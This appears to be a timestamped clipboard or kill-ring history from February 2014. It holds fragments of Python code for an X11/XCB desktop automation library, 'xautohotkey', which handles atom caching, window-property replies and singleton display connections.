                           self._reply.value.buf()))

* Wed 19 Feb 2014 08:30:12 AM JST
ReplyLongTypeAbstract
* Wed 19 Feb 2014 08:33:15 AM JST
Type
* Wed 19 Feb 2014 08:33:20 AM JST
Tyep
* Wed 19 Feb 2014 08:33:27 AM JST
Type
* Wed 19 Feb 2014 08:33:39 AM JST
Type
* Wed 19 Feb 2014 08:33:45 AM JST
ReplyTypeLongAbstract
* Wed 19 Feb 2014 08:34:12 AM JST
Type
* Wed 19 Feb 2014 08:34:20 AM JST
Type
* Wed 19 Feb 2014 08:35:22 AM JST
class ReplyTypeLongAbstract(ReplyTypeAbstract):
    r"""
    """

    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        return list(unpack('I' * self._reply.value_len,
                           self._reply.value.buf()))



* Wed 19 Feb 2014 08:35:27 AM JST

class ReplyTypeLongAbstract(ReplyTypeAbstract):
    r"""
    """

    def get_value(self, ):
        r"""SUMMARY

        get_result()

        @Return:
        """
        return list(unpack('I' * self._reply.value_len,
                           self._reply.value.buf()))


* Wed 19 Feb 2014 08:37:07 AM JST
ret.
* Wed 19 Feb 2014 08:38:32 AM JST
ReplyTypeUTF8
* Wed 19 Feb 2014 08:38:34 AM JST
ReplyTypeUTF8_STRING
* Wed 19 Feb 2014 08:38:48 AM JST
ReplyTypeUTF8_STRING_LIST
* Wed 19 Feb 2014 08:38:56 AM JST
ReplyTypeATOM
* Wed 19 Feb 2014 08:39:04 AM JST
ReplyTypeCARDINAL
* Wed 19 Feb 2014 08:39:08 AM JST
ReplyTypeWINDOW
* Wed 19 Feb 2014 01:31:20 PM JST
_prope
* Wed 19 Feb 2014 01:33:20 PM JST
rep=
* Wed 19 Feb 2014 01:37:50 PM JST
ifrom
* Wed 19 Feb 2014 01:39:43 PM JST
property, 
* Wed 19 Feb 2014 01:40:57 PM JST
.connection
* Wed 19 Feb 2014 01:41:03 PM JST
connection
* Wed 19 Feb 2014 01:43:16 PM JST
.xconnection
* Wed 19 Feb 2014 01:43:25 PM JST
xconnection.
* Wed 19 Feb 2014 01:44:08 PM JST
.Connection
* Wed 19 Feb 2014 01:44:11 PM JST
.Connection
* Wed 19 Feb 2014 01:45:08 PM JST
AtomIdentifier
* Wed 19 Feb 2014 01:45:19 PM JST
atom, 
* Wed 19 Feb 2014 01:45:29 PM JST
atom.
* Wed 19 Feb 2014 01:45:55 PM JST
xconnection
* Wed 19 Feb 2014 01:47:41 PM JST
xautohotkey
* Wed 19 Feb 2014 01:48:05 PM JST
xconnection
* Wed 19 Feb 2014 01:48:19 PM JST
xconnection.
* Wed 19 Feb 2014 01:48:59 PM JST
atom
* Wed 19 Feb 2014 01:49:02 PM JST

* Wed 19 Feb 2014 01:49:02 PM JST

* Wed 19 Feb 2014 01:49:02 PM JST
from xautohotkey import AtomIdentifier

* Wed 19 Feb 2014 01:54:27 PM JST
c.core.property.get_property_reply(False, Atom(c, '_NET_WM_NAME'), Atom(c, 'UTF8_STRING'))
* Wed 19 Feb 2014 01:55:04 PM JST
81788974
* Wed 19 Feb 2014 01:56:54 PM JST
             
* Wed 19 Feb 2014 01:58:39 PM JST
type_name
* Wed 19 Feb 2014 02:01:40 PM JST
_connection
* Wed 19 Feb 2014 02:08:36 PM JST
/dir 
* Wed 19 Feb 2014 02:20:27 PM JST
name
* Wed 19 Feb 2014 02:21:10 PM JST
                
* Wed 19 Feb 2014 02:21:14 PM JST
                
* Wed 19 Feb 2014 02:21:18 PM JST
                
* Wed 19 Feb 2014 02:22:05 PM JST
ATOM
* Wed 19 Feb 2014 02:23:58 PM JST
ATOM
* Wed 19 Feb 2014 02:24:26 PM JST
name
* Wed 19 Feb 2014 02:24:38 PM JST

* Wed 19 Feb 2014 02:24:38 PM JST

* Wed 19 Feb 2014 02:24:39 PM JST
            print('DEBUG-2-atom.py')

* Wed 19 Feb 2014 02:24:40 PM JST

* Wed 19 Feb 2014 02:24:40 PM JST

* Wed 19 Feb 2014 02:24:40 PM JST
            print('DEBUG-1-atom.py')

* Wed 19 Feb 2014 02:26:47 PM JST

* Wed 19 Feb 2014 02:26:47 PM JST

* Wed 19 Feb 2014 02:26:48 PM JST
        print('DEBUG-1-atom.py')

* Wed 19 Feb 2014 02:26:49 PM JST

* Wed 19 Feb 2014 02:26:49 PM JST

* Wed 19 Feb 2014 02:26:49 PM JST
        print('DEBUG-2-atom.py')

* Wed 19 Feb 2014 02:28:12 PM JST
self._connection.
* Wed 19 Feb 2014 02:28:34 PM JST
self._connection.atom.get_atom(property_)
* Wed 19 Feb 2014 02:28:36 PM JST
property_
* Wed 19 Feb 2014 02:29:34 PM JST
81788974
* Wed 19 Feb 2014 02:30:19 PM JST
atom
* Wed 19 Feb 2014 02:36:03 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:11 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:12 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:12 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:12 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:12 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:12 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:12 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:12 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:36:30 PM JST
c=xautohotkey.xconnection.Connection()
* Wed 19 Feb 2014 02:36:45 PM JST
xautoho
* Wed 19 Feb 2014 02:36:46 PM JST
from xautoho
* Wed 19 Feb 2014 02:36:52 PM JST
c=xautohotkey.xconnection.Connection()
* Wed 19 Feb 2014 02:37:22 PM JST
core.
* Wed 19 Feb 2014 02:37:49 PM JST
wm_name
* Wed 19 Feb 2014 02:37:52 PM JST
_NET_WM_NAME
* Wed 19 Feb 2014 02:38:03 PM JST
rep=c.core.property.get_property_reply(False, 81788974, Atom(c,'_NET_WM_NAME'), Atom(c,'UTF8_STRING'), 0, 65535)
* Wed 19 Feb 2014 02:43:16 PM JST
connection
* Wed 19 Feb 2014 02:52:06 PM JST
args
* Wed 19 Feb 2014 02:52:19 PM JST
atomobj
* Wed 19 Feb 2014 02:53:04 PM JST
__doc__
* Wed 19 Feb 2014 02:55:03 PM JST
ValueError
* Wed 19 Feb 2014 02:55:14 PM JST

* Wed 19 Feb 2014 02:55:14 PM JST

* Wed 19 Feb 2014 02:55:14 PM JST
            # TODO: (Atami) [2014/02/13]

* Wed 19 Feb 2014 02:56:07 PM JST
3 <= len(args) <= 0
* Wed 19 Feb 2014 02:57:22 PM JST
len(args)
* Wed 19 Feb 2014 02:58:20 PM JST
len(('hello', 'world', 'yahoo'))
* Wed 19 Feb 2014 03:00:09 PM JST

* Wed 19 Feb 2014 03:00:09 PM JST

* Wed 19 Feb 2014 03:00:09 PM JST
        print(len(args))

* Wed 19 Feb 2014 03:00:23 PM JST
args_len
* Wed 19 Feb 2014 03:02:20 PM JST
    def __str__(self, ):
        return self._obj.__init__.__doc__

* Wed 19 Feb 2014 03:02:42 PM JST
AtomArgumentsLengthError
* Wed 19 Feb 2014 03:04:45 PM JST
    def __init__(self, atomobj):
        r"""
        """
        self._obj = atomobj

* Wed 19 Feb 2014 03:06:05 PM JST
    def __str__(self, ):
        return self._obj.__init__.__doc__

* Wed 19 Feb 2014 03:10:16 PM JST
AtomArgumentsDuplicateError
* Wed 19 Feb 2014 03:10:30 PM JST

* Wed 19 Feb 2014 03:10:30 PM JST

* Wed 19 Feb 2014 03:10:30 PM JST
                        # TODO: (Atami) [2014/02/13]

* Wed 19 Feb 2014 03:10:30 PM JST
                        # TODO: (Atami) [2014/02/13]

* Wed 19 Feb 2014 03:10:30 PM JST
                        # TODO: (Atami) [2014/02/13]
                        # DuplicateError

* Wed 19 Feb 2014 03:10:36 PM JST
raise AtomArgumentsDuplicateError(self, args)
* Wed 19 Feb 2014 03:10:44 PM JST

* Wed 19 Feb 2014 03:10:44 PM JST

* Wed 19 Feb 2014 03:10:44 PM JST
                        # TODO: (Atami) [2014/02/13]

* Wed 19 Feb 2014 03:10:44 PM JST
                        # TODO: (Atami) [2014/02/13]

* Wed 19 Feb 2014 03:10:44 PM JST
                        # TODO: (Atami) [2014/02/13]
                        # DuplicateError

* Wed 19 Feb 2014 03:11:36 PM JST

* Wed 19 Feb 2014 03:11:36 PM JST

* Wed 19 Feb 2014 03:11:36 PM JST
        if args:

* Wed 19 Feb 2014 03:16:53 PM JST
type(args[0]) == type(args[1])
* Wed 19 Feb 2014 03:17:00 PM JST
raise AtomArgumentsDuplicateError(self, args)
* Wed 19 Feb 2014 03:17:17 PM JST
        # for arguments
        self._num = None
        self._name = None


* Wed 19 Feb 2014 03:18:37 PM JST
args
* Wed 19 Feb 2014 03:18:39 PM JST
self.
* Wed 19 Feb 2014 03:25:45 PM JST

* Wed 19 Feb 2014 03:25:45 PM JST

* Wed 19 Feb 2014 03:25:45 PM JST
        @Return:

* Wed 19 Feb 2014 03:40:51 PM JST
AtomArgumentsError
* Wed 19 Feb 2014 03:41:34 PM JST

* Wed 19 Feb 2014 03:41:34 PM JST

* Wed 19 Feb 2014 03:41:34 PM JST
        if not self.:

* Wed 19 Feb 2014 03:50:20 PM JST
atom.AtomIdentifier(self)
* Wed 19 Feb 2014 03:54:08 PM JST
AtomIdentifier
* Wed 19 Feb 2014 03:54:19 PM JST
atom
* Wed 19 Feb 2014 03:54:29 PM JST
atom.
* Wed 19 Feb 2014 04:11:23 PM JST
self
* Wed 19 Feb 2014 04:11:29 PM JST
_
* Wed 19 Feb 2014 04:11:30 PM JST
self.
* Wed 19 Feb 2014 04:13:49 PM JST

* Wed 19 Feb 2014 04:13:49 PM JST

* Wed 19 Feb 2014 04:13:49 PM JST
        print(dir(self._connection))

* Wed 19 Feb 2014 04:21:43 PM JST
self.atom = atom.AtomIdentifier(self)
* Wed 19 Feb 2014 04:23:08 PM JST
        
* Wed 19 Feb 2014 04:23:09 PM JST
connection)
* Wed 19 Feb 2014 04:23:10 PM JST
type(connection)
* Wed 19 Feb 2014 04:23:59 PM JST
print(dir(connection))
* Wed 19 Feb 2014 04:24:28 PM JST

* Wed 19 Feb 2014 04:24:28 PM JST

* Wed 19 Feb 2014 04:24:28 PM JST
        print(type(connection))

* Wed 19 Feb 2014 04:24:28 PM JST
        print(type(connection))

* Wed 19 Feb 2014 04:24:29 PM JST
        print(type(connection))
        print(dir(connection))

* Wed 19 Feb 2014 04:26:49 PM JST

* Wed 19 Feb 2014 04:26:49 PM JST

* Wed 19 Feb 2014 04:26:49 PM JST
        self.atom = atom.AtomIdentifier(self)

* Wed 19 Feb 2014 04:50:19 PM JST
class DispatchSingletonMeta(type):
    """Single Dispatch Singleton Meta.

    like use.
    class MyClass(BaseClass):
        __metaclass__ = DispatchSingletonMeta
        def __init__(self, etc):
            self._etc = etc
    """
    _instances = {}

    def __call__(cls, *args, **kwargs):
        if not args:
            key = ''
            args = tuple(key)
        else:
            key = args[0]
        if cls not in cls._instances:
            cls._instances[cls] = {}
        if key not in cls._instances[cls]:
            cls._instances[cls][key] = (super(DispatchSingletonMeta, cls)
                                        .__call__(*args, **kwargs))
        return cls._instances[cls][key]

* Wed 19 Feb 2014 04:50:53 PM JST
SingletonMeta
* Wed 19 Feb 2014 04:51:15 PM JST
cls
* Wed 19 Feb 2014 04:51:17 PM JST
self,
* Wed 19 Feb 2014 04:54:17 PM JST
cls, 
* Wed 19 Feb 2014 04:54:22 PM JST
self
* Wed 19 Feb 2014 04:55:11 PM JST
self.
* Wed 19 Feb 2014 04:55:29 PM JST
object
* Wed 19 Feb 2014 04:57:16 PM JST
_connection
* Wed 19 Feb 2014 04:57:36 PM JST
None
* Wed 19 Feb 2014 04:57:36 PM JST
display=None
* Wed 19 Feb 2014 04:57:49 PM JST
*args, **kwargs
* Wed 19 Feb 2014 05:05:46 PM JST
    
* Wed 19 Feb 2014 05:05:56 PM JST
Singleton Connection by display name.
* Wed 19 Feb 2014 05:07:32 PM JST
        if 'display' in kwargs:
            key = kwargs['display']
        else:
            key = ''

* Wed 19 Feb 2014 05:07:42 PM JST
key
* Wed 19 Feb 2014 05:08:07 PM JST
self.display_name
* Wed 19 Feb 2014 05:09:03 PM JST
getargspec
* Wed 19 Feb 2014 05:09:16 PM JST
getargspec(xcb.connect)
* Wed 19 Feb 2014 05:17:29 PM JST
connection
* Wed 19 Feb 2014 05:17:39 PM JST

* Wed 19 Feb 2014 05:17:39 PM JST

* Wed 19 Feb 2014 05:17:39 PM JST
        self._connection = connection

* Wed 19 Feb 2014 05:18:07 PM JST
display_name, 
* Wed 19 Feb 2014 05:19:59 PM JST
SingletonConnection
* Wed 19 Feb 2014 05:20:04 PM JST
XCON
* Wed 19 Feb 2014 05:21:27 PM JST
class SingletonConnectionMeta(type):
    r"""Singleton Connection by display name."""

    _instances = {}

    def __call__(cls, *args, **kwargs):
        if 'display' in kwargs:
            key = kwargs['display']
        else:
            key = ''
        if cls not in cls._instances:
            cls._instances[cls] = {}
        if key not in cls._instances[cls]:
            cls._instances[cls][key] = (super(SingletonConnectionMeta, cls)
                                        .__call__(*args, **kwargs))
        return cls._instances[cls][key]


class SingletonConnection(object):
    r"""Singleton Connection by display name.
    """
    __metaclass__ = SingletonConnectionMeta

    def __init__(self, *args, **kwargs):
        r"""
        """
        if 'display' in kwargs:
            self.display_name = kwargs['display']
        else:
            self.display_name = ''
        self._xcb_connection = xcb.connect(*args, **kwargs)


XCON = SingletonConnection



* Wed 19 Feb 2014 05:21:43 PM JST
Core
* Wed 19 Feb 2014 05:22:20 PM JST
connection
* Wed 19 Feb 2014 05:22:27 PM JST

* Wed 19 Feb 2014 05:22:27 PM JST

* Wed 19 Feb 2014 05:22:27 PM JST
        self._connection = connection

* Wed 19 Feb 2014 05:22:48 PM JST
self.display_name
* Wed 19 Feb 2014 05:23:49 PM JST
connection
* Wed 19 Feb 2014 05:24:02 PM JST

* Wed 19 Feb 2014 05:24:02 PM JST

* Wed 19 Feb 2014 05:24:02 PM JST
        self._connection = connection

* Wed 19 Feb 2014 05:27:25 PM JST
class Core(object):
    r"""
    """

    def __init__(self, display_name=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display_name = display_name or ''
        self.atom = atom.AtomIdentifier(self.display_name)
        self.property = PropertyHandler(self.display_name)

* Wed 19 Feb 2014 05:27:40 PM JST
from xautohotkey import reply, atom
* Wed 19 Feb 2014 05:28:04 PM JST
class PropertyHandler(object):
    r"""
    """

    def __init__(self, display_name=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display_name = display_name or ''
        self._dispatcher = reply.ReplyDispatcher(self.display_name)

    def get_property_reply(self, delete, window,
                           property_, type_, offset, length):
        r"""SUMMARY

        get_property_reply(delete, window, property_, type_, offset, length)

        @Arguments:
        - `delete`:
        - `window`:
        - `property_`:
        - `type_`:
        - `offset`:
        - `length`:

        @Return:
        """
        connection = XCON(self.display_name)
        property_ = self._connection.atom.get_atom(property_)
        type_ = self._connection.atom.get_atom(type_)
        reply = self._connection._xcb_connection.core.GetProperty(
            delete, window, property_, type_, offset, length).reply()
        return self._dispatcher(reply)

* Wed 19 Feb 2014 05:28:55 PM JST
atom, 
* Wed 19 Feb 2014 05:28:56 PM JST
reply, atom, 
* Wed 19 Feb 2014 05:29:53 PM JST
xconnection
* Wed 19 Feb 2014 05:30:06 PM JST
_
* Wed 19 Feb 2014 05:30:07 PM JST
self.
* Wed 19 Feb 2014 05:30:14 PM JST
_
* Wed 19 Feb 2014 05:30:15 PM JST
self.
* Wed 19 Feb 2014 05:30:23 PM JST
_
* Wed 19 Feb 2014 05:30:24 PM JST
self._
* Wed 19 Feb 2014 05:31:02 PM JST
repled
* Wed 19 Feb 2014 05:31:05 PM JST
reply
* Wed 19 Feb 2014 05:32:04 PM JST
properties
* Wed 19 Feb 2014 05:32:16 PM JST
properties
* Wed 19 Feb 2014 05:32:44 PM JST
connection
* Wed 19 Feb 2014 05:32:50 PM JST
connection
* Wed 19 Feb 2014 05:32:55 PM JST
_connection
* Wed 19 Feb 2014 05:33:41 PM JST
_connection
* Wed 19 Feb 2014 05:33:41 PM JST
self._connection
* Wed 19 Feb 2014 05:34:11 PM JST
connection
* Wed 19 Feb 2014 05:34:21 PM JST
display_name=None, 
* Wed 19 Feb 2014 05:34:29 PM JST
_connection
* Wed 19 Feb 2014 05:34:33 PM JST
connection
* Wed 19 Feb 2014 05:34:42 PM JST
_connection
* Wed 19 Feb 2014 05:34:42 PM JST
self._connection
* Wed 19 Feb 2014 05:35:15 PM JST
self.display_name, 
* Wed 19 Feb 2014 05:36:26 PM JST
XCON(display=self.display_name)
* Wed 19 Feb 2014 05:37:58 PM JST

* Wed 19 Feb 2014 05:37:58 PM JST

* Wed 19 Feb 2014 05:37:58 PM JST
        self._connection = connection

* Wed 19 Feb 2014 05:38:43 PM JST
_
* Wed 19 Feb 2014 05:38:44 PM JST
self._
* Wed 19 Feb 2014 05:39:10 PM JST
connection
* Wed 19 Feb 2014 05:39:19 PM JST
display_name=None,
* Wed 19 Feb 2014 05:39:54 PM JST

* Wed 19 Feb 2014 05:39:54 PM JST

* Wed 19 Feb 2014 05:39:54 PM JST
        self._connection = connection

* Wed 19 Feb 2014 05:40:21 PM JST
self.display_name, 
* Wed 19 Feb 2014 05:40:28 PM JST
self.display_name, 
* Wed 19 Feb 2014 05:41:33 PM JST
connection = XCON(display=self.display_name)
* Wed 19 Feb 2014 05:41:39 PM JST
_
* Wed 19 Feb 2014 05:41:40 PM JST
self._
* Wed 19 Feb 2014 05:42:07 PM JST
connection
* Wed 19 Feb 2014 05:42:21 PM JST

* Wed 19 Feb 2014 05:42:21 PM JST

* Wed 19 Feb 2014 05:42:21 PM JST
        self._connection = connection

* Wed 19 Feb 2014 05:43:02 PM JST
_
* Wed 19 Feb 2014 05:43:02 PM JST
self._
* Wed 19 Feb 2014 05:43:12 PM JST
        connection = XCON(display=self.display_name)

* Wed 19 Feb 2014 05:43:20 PM JST
connection
* Wed 19 Feb 2014 05:43:27 PM JST
self.display_name
* Wed 19 Feb 2014 05:43:33 PM JST
_connection, 
* Wed 19 Feb 2014 05:43:34 PM JST
self._connection, 
* Wed 19 Feb 2014 05:43:35 PM JST

* Wed 19 Feb 2014 05:43:35 PM JST

* Wed 19 Feb 2014 05:43:35 PM JST
            connection = XCON(display=self.display_name)

* Wed 19 Feb 2014 05:43:44 PM JST
            connection = XCON(display=self.display_name)

* Wed 19 Feb 2014 05:43:49 PM JST
_
* Wed 19 Feb 2014 05:43:50 PM JST
self._
* Wed 19 Feb 2014 05:43:59 PM JST
_
* Wed 19 Feb 2014 05:44:00 PM JST
self._
* Wed 19 Feb 2014 05:44:33 PM JST
connection = XCON(display=self.display_name)
* Wed 19 Feb 2014 05:44:39 PM JST
_
* Wed 19 Feb 2014 05:44:40 PM JST
self._
* Wed 19 Feb 2014 05:45:26 PM JST
x
* Wed 19 Feb 2014 05:45:27 PM JST
import x
* Wed 19 Feb 2014 05:47:49 PM JST
from xautohotkey.xconnection import XCON
* Wed 19 Feb 2014 05:48:24 PM JST
xconnection 
* Wed 19 Feb 2014 05:48:37 PM JST
xconnection 
* Wed 19 Feb 2014 05:49:01 PM JST
XCON
* Wed 19 Feb 2014 05:49:25 PM JST
from xautohotkey.xconnection import XCON
* Wed 19 Feb 2014 05:53:15 PM JST

* Wed 19 Feb 2014 05:53:15 PM JST

* Wed 19 Feb 2014 05:53:15 PM JST
from xautohotkey.xconnection import XCON

* Wed 19 Feb 2014 05:54:09 PM JST
xconnection
* Wed 19 Feb 2014 05:55:28 PM JST
, atom, reply, window
* Wed 19 Feb 2014 06:04:52 PM JST

* Wed 19 Feb 2014 06:04:52 PM JST

* Wed 19 Feb 2014 06:04:52 PM JST
        self.core = core.Core(self.display_name)

* Wed 19 Feb 2014 06:04:54 PM JST
_xcb_
* Wed 19 Feb 2014 06:50:18 PM JST
self.display_name
* Wed 19 Feb 2014 06:50:53 PM JST
display_name=self.display_name
* Wed 19 Feb 2014 09:45:33 PM JST

* Wed 19 Feb 2014 09:45:33 PM JST

* Wed 19 Feb 2014 09:45:33 PM JST
XCON = xconnection.SingletonConnection

* Wed 19 Feb 2014 09:45:41 PM JST
xconnection
* Wed 19 Feb 2014 09:45:46 PM JST
xconnection
* Wed 19 Feb 2014 09:45:55 PM JST
XCON
* Wed 19 Feb 2014 09:47:51 PM JST
core
* Wed 19 Feb 2014 09:47:51 PM JST
self.core
* Wed 19 Feb 2014 09:48:39 PM JST
self.display_name
* Wed 19 Feb 2014 10:02:21 PM JST
atom.
* Wed 19 Feb 2014 10:02:23 PM JST
atom.
* Wed 19 Feb 2014 10:02:47 PM JST
False, len(name), str(name)).reply().atom
* Wed 19 Feb 2014 10:09:10 PM JST
                
* Wed 19 Feb 2014 10:14:29 PM JST

* Wed 19 Feb 2014 10:14:29 PM JST

* Wed 19 Feb 2014 10:14:29 PM JST
        connection = XCON(display=self.display_name)

* Wed 19 Feb 2014 10:15:07 PM JST
core
* Wed 19 Feb 2014 10:15:15 PM JST
display=
* Wed 19 Feb 2014 10:18:46 PM JST
self, 
* Wed 19 Feb 2014 10:18:56 PM JST
display=
* Wed 19 Feb 2014 10:24:52 PM JST
self.display_name
* Wed 19 Feb 2014 10:25:12 PM JST

* Wed 19 Feb 2014 10:25:12 PM JST

* Wed 19 Feb 2014 10:25:12 PM JST
        connection = XCON(display=self.display_name)

* Wed 19 Feb 2014 10:25:43 PM JST
self.display_name
* Wed 19 Feb 2014 10:25:58 PM JST

* Wed 19 Feb 2014 10:25:58 PM JST

* Wed 19 Feb 2014 10:25:58 PM JST
        connection = XCON(display=self.display_name)

* Thu 20 Feb 2014 08:43:52 AM JST
get_connection
* Thu 20 Feb 2014 08:44:01 AM JST

* Thu 20 Feb 2014 08:44:01 AM JST

* Thu 20 Feb 2014 08:44:01 AM JST
XCON = SingletonConnection.get_connection

* Thu 20 Feb 2014 08:45:09 AM JST
class AtomCache(object):
    r"""
    """

    def __init__(self, dic=None):
        r"""

        @Arguments:
        - `dic`:
        """
        self._dic = dic or {}

    def _add(self, key, value):
        r"""SUMMARY

        _add()

        @Return:
        """
        for arg in (key, value):
            if not isinstance(arg, (AtomName, AtomNumber)):
                # TODO: (Atami) [2014/02/17]
                raise ValueError(arg)
        self._dic[key] = value

    def dual_add(self, arg1, arg2):
        r"""SUMMARY

        dual_add(arg1, arg2)

        @Arguments:
        - `arg1`:
        - `arg2`:

        @Return:
        """
        self._add(arg1, arg2)
        self._add(arg2, arg1)

    def get(self, key):
        r"""SUMMARY

        get(key)

        @Arguments:
        - `key`:

        @Return:
        """
        if key in self._dic:
            return self._dic[key]
        # TODO: (Atami) [2014/02/17]
        # default return

    def clear(self, ):
        r"""SUMMARY

        clear()

        @Return:
        """
        self._dic.clear()

    def __contains__(self, key):
        return key in self._dic

    def __repr__(self, ):
        return repr(self._dic)


class AtomIdentifier(object):
    r"""
    """
    # TODO: (Atami) [2014/02/17]
    # behave atom 0

    def __init__(self, display_name=None):
        r"""
        """
        self.display_name = display_name or ''
        self._cache = AtomCache()

    def get_atom(self, atom, cache=True):
        r"""SUMMARY

        get_atom(atom, cache=True)

        @Arguments:
        - `atom`:
        - `cache`:

        @Return:
        """
        return Atom(atom, display_name=self.display_name)

    def intern_atom(self, name, cache=True):
        r"""SUMMARY

        intern_atom(name)

        @Arguments:
        - `name`:

        @Return:
        """
        if not isinstance(name, (str)):
            raise ValueError(name)

        if not isinstance(name, (AtomName)):
            name = AtomName(name, self.display_name)

        if cache and name in self._cache:
            return self._cache.get(name)
        connection = XCON(display=self.display_name)
        atom = (connection.core.InternAtom(
            False, len(name), str(name)).reply().atom)
        atom = AtomNumber(atom, self.display_name)
        if cache:
            self._cache.dual_add(name, atom) # cache
        return atom

    def get_atom_name(self, atom, cache=True):
        r"""SUMMARY

        get_atom_name(atom, cache=True)

        @Arguments:
        - `atom`:
        - `cache`:

        @Return:
        """
        if not isinstance(atom, (int)):
            raise ValueError(atom)

        if not isinstance(atom, (AtomNumber)):
            atom = AtomNumber(atom, self.display_name)

        if cache and atom in self._cache:
            return self._cache.get(atom)
        connection = XCON(display=self.display_name)
        name = str(connection._xcb_connection.core.GetAtomName(atom)
                   .reply().name.buf())
        name = AtomName(name, self.display_name)
        if cache:
            self._cache.dual_add(name, atom)
        return name


* Thu 20 Feb 2014 08:47:16 AM JST
AtomName
* Thu 20 Feb 2014 08:47:40 AM JST
class SingletonConnectionMeta(type):
    r"""Singleton Connection by display name."""

    _instances = {}

    def __call__(cls, *args, **kwargs):
        if 'display' in kwargs:
            key = kwargs['display']
        else:
            key = ''
        if cls not in cls._instances:
            cls._instances[cls] = {}
        if key not in cls._instances[cls]:
            cls._instances[cls][key] = (super(SingletonConnectionMeta, cls)
                                        .__call__(*args, **kwargs))
        return cls._instances[cls][key]

* Thu 20 Feb 2014 08:54:29 AM JST
SingleConnection
* Thu 20 Feb 2014 08:55:48 AM JST
_xcb_connection
* Thu 20 Feb 2014 08:56:15 AM JST
                   
* Thu 20 Feb 2014 08:57:46 AM JST
self, 
* Thu 20 Feb 2014 09:00:39 AM JST
get_intern
* Thu 20 Feb 2014 09:01:22 AM JST

* Thu 20 Feb 2014 09:01:22 AM JST

* Thu 20 Feb 2014 09:01:22 AM JST
        # atom = AtomNumber(atom, self.display_name)

* Thu 20 Feb 2014 09:01:32 AM JST

* Thu 20 Feb 2014 09:01:32 AM JST

* Thu 20 Feb 2014 09:01:32 AM JST
        # name = AtomName(name, self.display_name)

* Thu 20 Feb 2014 09:02:28 AM JST

* Thu 20 Feb 2014 09:02:29 AM JST

* Thu 20 Feb 2014 09:02:29 AM JST
        # self.core = core.Core(self.display_name)

* Thu 20 Feb 2014 09:07:22 AM JST
class ReplyDispatcher(object):
    r"""
    """
    _types_list = TYPES_LIST

    def __init__(self, display_name=None):
        r"""

        @Arguments:
        - `connection`:
        """
        self.display_name = display_name or ''
        self._class_map = {}
        self.make_class_map()

    def clear(self, ):
        r"""SUMMARY

        clear()

        @Return:
        """
        self._class_map.clear()

    def make_class_map(self, ):
        r"""SUMMARY

        make_class_map()

        @Return:
        """
        for klass in self._types_list:
            self._class_map[Atom(self.display_name, klass.type_name)] = klass

    def dispatch(self, reply):
        r"""SUMMARY

        dispatch_reply(reply)

        @Arguments:
        - `reply`:

        @Return:
        """
        atom = Atom(self.display_name, reply.type)
        if atom in self._class_map:
            return self._class_map[atom](reply, self.display_name)
        # TODO: (Atami) [2014/02/19]
        # return ReplyAny() if not exists.
        raise ValueError()

    def __call__(self, reply):
        return self.dispatch(reply)

* Thu 20 Feb 2014 09:08:42 AM JST
display
* Thu 20 Feb 2014 09:08:43 AM JST
self.display
* Thu 20 Feb 2014 09:09:26 AM JST
getatom
* Thu 20 Feb 2014 09:09:57 AM JST
AtomIdentifier.get_instance(display=self.display)
* Thu 20 Feb 2014 09:11:37 AM JST
atom
* Thu 20 Feb 2014 09:11:47 AM JST
atom
* Thu 20 Feb 2014 09:16:36 AM JST
class PropertyHandler(object):
